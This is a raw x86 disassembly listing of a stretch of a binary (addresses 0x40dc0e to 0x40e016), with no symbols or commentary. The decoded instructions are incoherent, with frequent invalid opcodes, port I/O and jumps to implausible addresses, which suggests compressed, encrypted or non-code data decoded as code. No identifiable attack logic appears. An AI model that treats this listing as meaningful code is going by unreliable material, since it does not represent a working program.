  40dc0e:	d6                   	salc
  40dc0f:	28 87 76 7f 08 96    	sub    %al,-0x69f7808a(%edi)
  40dc15:	e9 db 4c 3f 70       	jmp    0x708028f5
  40dc1a:	82 be 90 41 2a 35 04 	cmpb   $0x4,0x352a4190(%esi)
  40dc21:	a2 8f 83 72 60       	mov    %al,0x6072838f
  40dc26:	90                   	nop
  40dc27:	97                   	xchg   %eax,%edi
  40dc28:	5e                   	pop    %esi
  40dc29:	d1 d4                	rcl    $1,%esp
  40dc2b:	47                   	inc    %edi
  40dc2c:	7d eb                	jge    0x40dc19
  40dc2e:	d2 f9                	sar    %cl,%cl
  40dc30:	0f 12 87 28 d6 d3 ea 	movlps -0x152c29d8(%edi),%xmm0
  40dc37:	4e                   	dec    %esi
  40dc38:	93                   	xchg   %eax,%ebx
  40dc39:	7a f2                	jp     0x40dc2d
  40dc3b:	6d                   	insl   (%dx),%es:(%edi)
  40dc3c:	6a 6b                	push   $0x6b
  40dc3e:	2c fb                	sub    $0xfb,%al
  40dc40:	c9                   	leave
  40dc41:	11 7c 5a e6          	adc    %edi,-0x1a(%edx,%ebx,2)
  40dc45:	a2 f5 b6 89 96       	mov    %al,0x9689b6f5
  40dc4a:	ac                   	lods   %ds:(%esi),%al
  40dc4b:	ee                   	out    %al,(%dx)
  40dc4c:	10 2a                	adc    %ch,(%edx)
  40dc4e:	65 9a be 96 53 0f da 	gs lcall $0x38da,$0xf5396be
  40dc55:	38 
  40dc56:	86 e3                	xchg   %ah,%bl
  40dc58:	9e                   	sahf
  40dc59:	c9                   	leave
  40dc5a:	5d                   	pop    %ebp
  40dc5b:	14 53                	adc    $0x53,%al
  40dc5d:	30 22                	xor    %ah,(%edx)
  40dc5f:	7f 26                	jg     0x40dc87
  40dc61:	0c 5c                	or     $0x5c,%al
  40dc63:	b0 96                	mov    $0x96,%al
  40dc65:	43                   	inc    %ebx
  40dc66:	21 8b 60 c7 78 c6    	and    %ecx,-0x398738a0(%ebx)
  40dc6c:	41                   	inc    %ecx
  40dc6d:	3e 0a 43 91          	or     %ds:-0x6f(%ebx),%al
  40dc71:	eb 9b                	jmp    0x40dc0e
  40dc73:	f8                   	clc
  40dc74:	dc fe                	fdivr  %st,%st(6)
  40dc76:	7e 61                	jle    0x40dcd9
  40dc78:	cb                   	lret
  40dc79:	87 4b a6             	xchg   %ecx,-0x5a(%ebx)
  40dc7c:	24 55                	and    $0x55,%al
  40dc7e:	01 6a fa             	add    %ebp,-0x6(%edx)
  40dc81:	7f 7a                	jg     0x40dcfd
  40dc83:	21 e0                	and    %esp,%eax
  40dc85:	63 99 6c 30 0b 64    	arpl   %ebx,0x640b306c(%ecx)
  40dc8b:	76 66                	jbe    0x40dcf3
  40dc8d:	97                   	xchg   %eax,%edi
  40dc8e:	05 7a 28 b2 ff       	add    $0xffb2287a,%eax
  40dc93:	50                   	push   %eax
  40dc94:	ed                   	in     (%dx),%eax
  40dc95:	8f                   	(bad)
  40dc96:	34 9f                	xor    $0x9f,%al
  40dc98:	29 c8                	sub    %ecx,%eax
  40dc9a:	72 06                	jb     0x40dca2
  40dc9c:	12 a2 7f 4b 09 00    	adc    0x94b7f(%edx),%ah
  40dca2:	61                   	popa
  40dca3:	73 90                	jae    0x40dc35
  40dca5:	dc ea                	fsubr  %st,%st(2)
  40dca7:	e1 15                	loope  0x40dcbe
  40dca9:	49                   	dec    %ecx
  40dcaa:	09 58 0c             	or     %ebx,0xc(%eax)
  40dcad:	cc                   	int3
  40dcae:	28 39                	sub    %bh,(%ecx)
  40dcb0:	fd                   	std
  40dcb1:	7b 6c                	jnp    0x40dd1f
  40dcb3:	44                   	inc    %esp
  40dcb4:	ed                   	in     (%dx),%eax
  40dcb5:	77 93                	ja     0x40dc4a
  40dcb7:	a8 a6                	test   $0xa6,%al
  40dcb9:	0a 2b                	or     (%ebx),%ch
  40dcbb:	df ab 70 c8 d1 4c    	fildll 0x4cd1c870(%ebx)
  40dcc1:	9c                   	pushf
  40dcc2:	a3 37 a7 30 2b       	mov    %eax,0x2b30a737
  40dcc7:	4b                   	dec    %ebx
  40dcc8:	68 aa b5 27 c2       	push   $0xc227b5aa
  40dccd:	b9 dc 93 10 07       	mov    $0x71093dc,%ecx
  40dcd2:	57                   	push   %edi
  40dcd3:	05 17 95 92 8c       	add    $0x8c929517,%eax
  40dcd8:	4d                   	dec    %ebp
  40dcd9:	5a                   	pop    %edx
  40dcda:	fe                   	(bad)
  40dcdb:	75 9c                	jne    0x40dc79
  40dcdd:	15 68 4b 09 3b       	adc    $0x3b094b68,%eax
  40dce2:	b3 47                	mov    $0x47,%bl
  40dce4:	a8 5f                	test   $0x5f,%al
  40dce6:	22 6a 64             	and    0x64(%edx),%ch
  40dce9:	8c df                	mov    %ds,%edi
  40dceb:	86 d8                	xchg   %bl,%al
  40dced:	08 0a                	or     %cl,(%edx)
  40dcef:	57                   	push   %edi
  40dcf0:	2b f5                	sub    %ebp,%esi
  40dcf2:	4b                   	dec    %ebx
  40dcf3:	f8                   	clc
  40dcf4:	42                   	inc    %edx
  40dcf5:	68 9d 21 db bc       	push   $0xbcdb219d
  40dcfa:	01 b6 5f 43 f1 a0    	add    %esi,-0x5f0ebca1(%esi)
  40dd00:	72 c1                	jb     0x40dcc3
  40dd02:	b4 b2                	mov    $0xb2,%ah
  40dd04:	6a b9                	push   $0xffffffb9
  40dd06:	8d 47 a8             	lea    -0x58(%edi),%eax
  40dd09:	d4 dd                	aam    $0xdd
  40dd0b:	7a 1c                	jp     0x40dd29
  40dd0d:	28 85 8f 7a 25 c7    	sub    %al,-0x38da8571(%ebp)
  40dd13:	88 8d 57 59 a4 97    	mov    %cl,-0x685ba6a9(%ebp)
  40dd19:	4c                   	dec    %esp
  40dd1a:	b8 7d 1f 30 61       	mov    $0x61301f7d,%eax
  40dd1f:	bb 68 e9 be e2       	mov    $0xe2bee968,%ebx
  40dd24:	2c d5                	sub    $0xd5,%al
  40dd26:	07                   	pop    %es
  40dd27:	4b                   	dec    %ebx
  40dd28:	c3                   	ret
  40dd29:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40dd2a:	27                   	daa
  40dd2b:	84 7c e6 85          	test   %bh,-0x7b(%esi,%eiz,8)
  40dd2f:	5b                   	pop    %ebx
  40dd30:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40dd31:	42                   	inc    %edx
  40dd32:	da 34 2d 6a 69 f4 4f 	fidivl 0x4ff4696a(,%ebp,1)
  40dd39:	08 f3                	or     %dh,%bl
  40dd3b:	78 52                	js     0x40dd8f
  40dd3d:	3b 7e 4f             	cmp    0x4f(%esi),%edi
  40dd40:	6b dd 70             	imul   $0x70,%ebp,%ebx
  40dd43:	91                   	xchg   %eax,%ecx
  40dd44:	6b 4b 0e 62          	imul   $0x62,0xe(%ebx),%ecx
  40dd48:	61                   	popa
  40dd49:	42                   	inc    %edx
  40dd4a:	b9 0e a2 d0 b8       	mov    $0xb8d0a20e,%ecx
  40dd4f:	40                   	inc    %eax
  40dd50:	93                   	xchg   %eax,%ebx
  40dd51:	6b b1 91 5c a0 24 cf 	imul   $0xffffffcf,0x24a05c91(%ecx),%esi
  40dd58:	64 7d 0c             	fs jge 0x40dd67
  40dd5b:	c7                   	(bad)
  40dd5c:	8d 96 84 8b 72 30    	lea    0x30728b84(%esi),%edx
  40dd62:	99                   	cltd
  40dd63:	74 3d                	je     0x40dda2
  40dd65:	c6                   	(bad)
  40dd66:	76 3b                	jbe    0x40dda3
  40dd68:	c0 11 7b             	rclb   $0x7b,(%ecx)
  40dd6b:	0f 3b                	(bad)
  40dd6d:	fb                   	sti
  40dd6e:	77 d5                	ja     0x40dd45
  40dd70:	9f                   	lahf
  40dd71:	5b                   	pop    %ebx
  40dd72:	a0 41 17 7d 04       	mov    0x47d1741,%al
  40dd77:	e7 df                	out    %eax,$0xdf
  40dd79:	12 01                	adc    (%ecx),%al
  40dd7b:	2e 6b 1d ee bd b9 03 	imul   $0x3,%cs:0x3b9bdee,%ebx
  40dd82:	03 
  40dd83:	86 b6 3f 78 51 31    	xchg   %dh,0x3151783f(%esi)
  40dd89:	dd bf 49 92 bf be    	fnstsw -0x41406db7(%edi)
  40dd8f:	ef                   	out    %eax,(%dx)
  40dd90:	81 f2 da d5 f8 e2    	xor    $0xe2f8d5da,%edx
  40dd96:	99                   	cltd
  40dd97:	03 a2 6f 8c 3a b7    	add    -0x48c57391(%edx),%esp
  40dd9d:	81 69 85 7e 50 91 0e 	subl   $0xe91507e,-0x7b(%ecx)
  40dda4:	12 d1                	adc    %cl,%dl
  40dda6:	af                   	scas   %es:(%edi),%eax
  40dda7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40dda8:	e8 30 68 21 27       	call   0x276245dd
  40ddad:	fd                   	std
  40ddae:	1c ba                	sbb    $0xba,%al
  40ddb0:	1e                   	push   %ds
  40ddb1:	f9                   	stc
  40ddb2:	55                   	push   %ebp
  40ddb3:	aa                   	stos   %al,%es:(%edi)
  40ddb4:	58                   	pop    %eax
  40ddb5:	d1 41 cb             	roll   $1,-0x35(%ecx)
  40ddb8:	c2 7c a0             	ret    $0xa07c
  40ddbb:	79 04                	jns    0x40ddc1
  40ddbd:	04 ba                	add    $0xba,%al
  40ddbf:	ce                   	into
  40ddc0:	4e                   	dec    %esi
  40ddc1:	4c                   	dec    %esp
  40ddc2:	95                   	xchg   %eax,%ebp
  40ddc3:	e5 d4                	in     $0xd4,%eax
  40ddc5:	e5 f2                	in     $0xf2,%eax
  40ddc7:	fd                   	std
  40ddc8:	0f 3c                	(bad)
  40ddca:	9e                   	sahf
  40ddcb:	91                   	xchg   %eax,%ecx
  40ddcc:	81 1c 57 63 13 96 06 	sbbl   $0x6961363,(%edi,%edx,2)
  40ddd3:	6b f1 28             	imul   $0x28,%ecx,%esi
  40ddd6:	54                   	push   %esp
  40ddd7:	d8 88 37 1b 3f 39    	fmuls  0x393f1b37(%eax)
  40dddd:	ca 2b a2             	lret   $0xa22b
  40dde0:	6c                   	insb   (%dx),%es:(%edi)
  40dde1:	dc cc                	fmul   %st,%st(4)
  40dde3:	35 17 7d d6 09       	xor    $0x9d67d17,%eax
  40dde8:	f2 e5 1b             	repnz in $0x1b,%eax
  40ddeb:	bb 12 01 13 04       	mov    $0x4130112,%ebx
  40ddf0:	2f                   	das
  40ddf1:	91                   	xchg   %eax,%ecx
  40ddf2:	02 a7 04 1a 16 91    	add    -0x6ee9e5fc(%edi),%ah
  40ddf8:	d5 f2                	aad    $0xf2
  40ddfa:	8a f4                	mov    %ah,%dh
  40ddfc:	76 48                	jbe    0x40de46
  40ddfe:	ed                   	in     (%dx),%eax
  40ddff:	14 55                	adc    $0x55,%al
  40de01:	f2 66 75 fd          	bnd data16 jne 0x40de02
  40de05:	b3 2d                	mov    $0x2d,%bl
  40de07:	55                   	push   %ebp
  40de08:	01 a1 e4 72 6e 5f    	add    %esp,0x5f6e72e4(%ecx)
  40de0e:	cc                   	int3
  40de0f:	94                   	xchg   %eax,%esp
  40de10:	75 61                	jne    0x40de73
  40de12:	cb                   	lret
  40de13:	51                   	push   %ecx
  40de14:	61                   	popa
  40de15:	b9 32 9a 19 51       	mov    $0x51199a32,%ecx
  40de1a:	27                   	daa
  40de1b:	a0 c0 f9 c1 5a       	mov    0x5ac1f9c0,%al
  40de20:	fb                   	sti
  40de21:	8b fc                	mov    %esp,%edi
  40de23:	6f                   	outsl  %ds:(%esi),(%dx)
  40de24:	c1 81 77 45 40 20 5a 	roll   $0x5a,0x20404577(%ecx)
  40de2b:	c7                   	(bad)
  40de2c:	6a 53                	push   $0x53
  40de2e:	98                   	cwtl
  40de2f:	5e                   	pop    %esi
  40de30:	fb                   	sti
  40de31:	67 eb 9d             	addr16 jmp 0x40ddd1
  40de34:	9e                   	sahf
  40de35:	f9                   	stc
  40de36:	e1 53                	loope  0x40de8b
  40de38:	70 4b                	jo     0x40de85
  40de3a:	6e                   	outsb  %ds:(%esi),(%dx)
  40de3b:	bf 94 41 3c 5d       	mov    $0x5d3c4194,%edi
  40de40:	58                   	pop    %eax
  40de41:	66 7c 8d             	data16 jl 0x40ddd1
  40de44:	e4 2b                	in     $0x2b,%al
  40de46:	d0 c0                	rol    $1,%al
  40de48:	79 94                	jns    0x40ddde
  40de4a:	63 4e e2             	arpl   %ecx,-0x1e(%esi)
  40de4d:	5d                   	pop    %ebp
  40de4e:	d0 4a 51             	rorb   $1,0x51(%edx)
  40de51:	7e a1                	jle    0x40ddf4
  40de53:	f6 4c 75 f6 80       	testb  $0x80,-0xa(%ebp,%esi,2)
  40de58:	ca cd 93             	lret   $0x93cd
  40de5b:	e6 80                	out    %al,$0x80
  40de5d:	72 aa                	jb     0x40de09
  40de5f:	b1 5e                	mov    $0x5e,%cl
  40de61:	8f                   	(bad)
  40de62:	d8 1c 0d 22 74 82 d7 	fcomps -0x287d8bde(,%ecx,1)
  40de69:	75 f8                	jne    0x40de63
  40de6b:	2d a8 89 4b 4b       	sub    $0x4b4b89a8,%eax
  40de70:	e9 64 e2 53 ec       	jmp    0xec94c0d9
  40de75:	c9                   	leave
  40de76:	04 34                	add    $0x34,%al
  40de78:	a3 2c 86 5a 47       	mov    %eax,0x475a862c
  40de7d:	9c                   	pushf
  40de7e:	14 ed                	adc    $0xed,%al
  40de80:	7f 51                	jg     0x40ded3
  40de82:	fa                   	cli
  40de83:	61                   	popa
  40de84:	5d                   	pop    %ebp
  40de85:	de e4                	fsubp  %st,%st(4)
  40de87:	29 e0                	sub    %esp,%eax
  40de89:	3d 91 28 52 c4       	cmp    $0xc4522891,%eax
  40de8e:	1f                   	pop    %ds
  40de8f:	90                   	nop
  40de90:	1f                   	pop    %ds
  40de91:	10 df                	adc    %bl,%bh
  40de93:	81 8a 43 37 22 8e f5 	orl    $0x93ce28f5,-0x71ddc8bd(%edx)
  40de9a:	28 ce 93 
  40de9d:	91                   	xchg   %eax,%ecx
  40de9e:	97                   	xchg   %eax,%edi
  40de9f:	26 e5 aa             	es in  $0xaa,%eax
  40dea2:	57                   	push   %edi
  40dea3:	2c c7                	sub    $0xc7,%al
  40dea5:	5c                   	pop    %esp
  40dea6:	d2 06                	rolb   %cl,(%esi)
  40dea8:	19 cc                	sbb    %ecx,%esp
  40deaa:	d3 75 5a             	shll   %cl,0x5a(%ebp)
  40dead:	a2 58 40 15 78       	mov    %al,0x78154058
  40deb2:	52                   	push   %edx
  40deb3:	eb 54                	jmp    0x40df09
  40deb5:	09 6f 31             	or     %ebp,0x31(%edi)
  40deb8:	f9                   	stc
  40deb9:	0d a6 ac e5 4a       	or     $0x4ae5aca6,%eax
  40debe:	d0 24 ea             	shlb   $1,(%edx,%ebp,8)
  40dec1:	30 71 6e             	xor    %dh,0x6e(%ecx)
  40dec4:	cf                   	iret
  40dec5:	00 bd 4e 9f 20 f7    	add    %bh,-0x8df60b2(%ebp)
  40decb:	ba c9 65 77 98       	mov    $0x987765c9,%edx
  40ded0:	83 e4 52             	and    $0x52,%esp
  40ded3:	cb                   	lret
  40ded4:	fb                   	sti
  40ded5:	62 48 0e             	bound  %ecx,0xe(%eax)
  40ded8:	26 ae                	es scas %es:(%edi),%al
  40deda:	c0 38 5c             	sarb   $0x5c,(%eax)
  40dedd:	d8 e8                	fsubr  %st(0),%st
  40dedf:	46                   	inc    %esi
  40dee0:	08 2d 26 e4 00 2c    	or     %ch,0x2c00e426
  40dee6:	39 7a d5             	cmp    %edi,-0x2b(%edx)
  40dee9:	d2 d5                	rcl    %cl,%ch
  40deeb:	1e                   	push   %ds
  40deec:	27                   	daa
  40deed:	3b 83 a8 a0 d3 66    	cmp    0x66d3a0a8(%ebx),%eax
  40def3:	13 83 ef 5c 35 0b    	adc    0xb355cef(%ebx),%eax
  40def9:	0a dd                	or     %ch,%bl
  40defb:	04 49                	add    $0x49,%al
  40defd:	50                   	push   %eax
  40defe:	31 64 d7 d0          	xor    %esp,-0x30(%edi,%edx,8)
  40df02:	a0 ff a1 41 eb       	mov    0xeb41a1ff,%al
  40df07:	1f                   	pop    %ds
  40df08:	ce                   	into
  40df09:	1b 74 4e a5          	sbb    -0x5b(%esi,%ecx,2),%esi
  40df0d:	32 81 02 df 44 eb    	xor    -0x14bb20fe(%ecx),%al
  40df13:	52                   	push   %edx
  40df14:	b6 9e                	mov    $0x9e,%dh
  40df16:	d8 08                	fmuls  (%eax)
  40df18:	ac                   	lods   %ds:(%esi),%al
  40df19:	df 23                	fbld   (%ebx)
  40df1b:	de c8                	fmulp  %st,%st(0)
  40df1d:	12 39                	adc    (%ecx),%bh
  40df1f:	fb                   	sti
  40df20:	47                   	inc    %edi
  40df21:	42                   	inc    %edx
  40df22:	19 a7 02 24 d8 e2    	sbb    %esp,-0x1d27dbfe(%edi)
  40df28:	6f                   	outsl  %ds:(%esi),(%dx)
  40df29:	da 9f 90 c0 89 25    	ficompl 0x2589c090(%edi)
  40df2f:	9d                   	popf
  40df30:	83 de 9f             	sbb    $0xffffff9f,%esi
  40df33:	30 aa 1e 61 33 04    	xor    %ch,0x433611e(%edx)
  40df39:	0c e4                	or     $0xe4,%al
  40df3b:	6d                   	insl   (%dx),%es:(%edi)
  40df3c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40df3d:	9d                   	popf
  40df3e:	be 63 2e 85 2f       	mov    $0x2f852e63,%esi
  40df43:	22 d6                	and    %dh,%dl
  40df45:	3b 75 65             	cmp    0x65(%ebp),%esi
  40df48:	72 ad                	jb     0x40def7
  40df4a:	52                   	push   %edx
  40df4b:	16                   	push   %ss
  40df4c:	27                   	daa
  40df4d:	7b bc                	jnp    0x40df0b
  40df4f:	3f                   	aas
  40df50:	56                   	push   %esi
  40df51:	4b                   	dec    %ebx
  40df52:	f1                   	int1
  40df53:	22 c4                	and    %ah,%al
  40df55:	90                   	nop
  40df56:	05 74 43 7b 10       	add    $0x107b4374,%eax
  40df5b:	77 c0                	ja     0x40df1d
  40df5d:	be 98 d2 8f 85       	mov    $0x858fd298,%esi
  40df62:	a2 4c 0e d2 6a       	mov    %al,0x6ad20e4c
  40df67:	22 7d 15             	and    0x15(%ebp),%bh
  40df6a:	61                   	popa
  40df6b:	87 87 9b 67 2f 3e    	xchg   %eax,0x3e2f679b(%edi)
  40df71:	cc                   	int3
  40df72:	1d 13 3e f0 42       	sbb    $0x42f03e13,%eax
  40df77:	e9 5f 9e e6 61       	jmp    0x62277ddb
  40df7c:	1f                   	pop    %ds
  40df7d:	35 09 ba 34 5e       	xor    $0x5e34ba09,%eax
  40df82:	92                   	xchg   %eax,%edx
  40df83:	3b 32                	cmp    (%edx),%esi
  40df85:	45                   	inc    %ebp
  40df86:	29 dd                	sub    %ebx,%ebp
  40df88:	46                   	inc    %esi
  40df89:	c9                   	leave
  40df8a:	a9 49 71 1b 67       	test   $0x671b7149,%eax
  40df8f:	f0 df 51 74          	lock fists 0x74(%ecx)
  40df93:	4a                   	dec    %edx
  40df94:	e7 6c                	out    %eax,$0x6c
  40df96:	11 13                	adc    %edx,(%ebx)
  40df98:	a9 24 87 5a 4c       	test   $0x4c5a8724,%eax
  40df9d:	54                   	push   %esp
  40df9e:	b5 75                	mov    $0x75,%ch
  40dfa0:	b7 b6                	mov    $0xb6,%bh
  40dfa2:	28 1a                	sub    %bl,(%edx)
  40dfa4:	5d                   	pop    %ebp
  40dfa5:	af                   	scas   %es:(%edi),%eax
  40dfa6:	41                   	inc    %ecx
  40dfa7:	bd bc 98 ac 75       	mov    $0x75ac98bc,%ebp
  40dfac:	e2 15                	loop   0x40dfc3
  40dfae:	aa                   	stos   %al,%es:(%edi)
  40dfaf:	5c                   	pop    %esp
  40dfb0:	af                   	scas   %es:(%edi),%eax
  40dfb1:	d4 77                	aam    $0x77
  40dfb3:	79 a0                	jns    0x40df55
  40dfb5:	cf                   	iret
  40dfb6:	d4 db                	aam    $0xdb
  40dfb8:	08 aa 41 be 8e 5e    	or     %ch,0x5e8ebe41(%edx)
  40dfbe:	2e 5f                	cs pop %edi
  40dfc0:	e9 2d 5d ff e7       	jmp    0xe8403cf2
  40dfc5:	c9                   	leave
  40dfc6:	6e                   	outsb  %ds:(%esi),(%dx)
  40dfc7:	15 58 58 83 f0       	adc    $0xf0835858,%eax
  40dfcc:	57                   	push   %edi
  40dfcd:	5c                   	pop    %esp
  40dfce:	74 d2                	je     0x40dfa2
  40dfd0:	3d ae 20 ce 5c       	cmp    $0x5cce20ae,%eax
  40dfd5:	b5 86                	mov    $0x86,%ch
  40dfd7:	9f                   	lahf
  40dfd8:	d8 24 cb             	fsubs  (%ebx,%ecx,8)
  40dfdb:	2d ae 0f c2 19       	sub    $0x19c20fae,%eax
  40dfe0:	35 7c a9 f0 e9       	xor    $0xe9f0a97c,%eax
  40dfe5:	a2 ab 9c bb d9       	mov    %al,0xd9bb9cab
  40dfea:	bf ab 69 bd 28       	mov    $0x28bd69ab,%edi
  40dfef:	f2 44                	repnz inc %esp
  40dff1:	51                   	push   %ecx
  40dff2:	b1 1e                	mov    $0x1e,%cl
  40dff4:	7c 17                	jl     0x40e00d
  40dff6:	90                   	nop
  40dff7:	5a                   	pop    %edx
  40dff8:	f0 e7 8d             	lock out %eax,$0x8d
  40dffb:	c6 c4 15             	mov    $0x15,%ah
  40dffe:	34 51                	xor    $0x51,%al
  40e000:	6e                   	outsb  %ds:(%esi),(%dx)
  40e001:	16                   	push   %ss
  40e002:	24 29                	and    $0x29,%al
  40e004:	05 c9 77 af 83       	add    $0x83af77c9,%eax
  40e009:	1b 59 cf             	sbb    -0x31(%ecx),%ebx
  40e00c:	1a ad 0d a7 95 0a    	sbb    0xa95a70d(%ebp),%ch
  40e012:	85 54 36 ab          	test   %edx,-0x55(%esi,%esi,1)
  40e016:	e3 0d                	jecxz  0x40e025
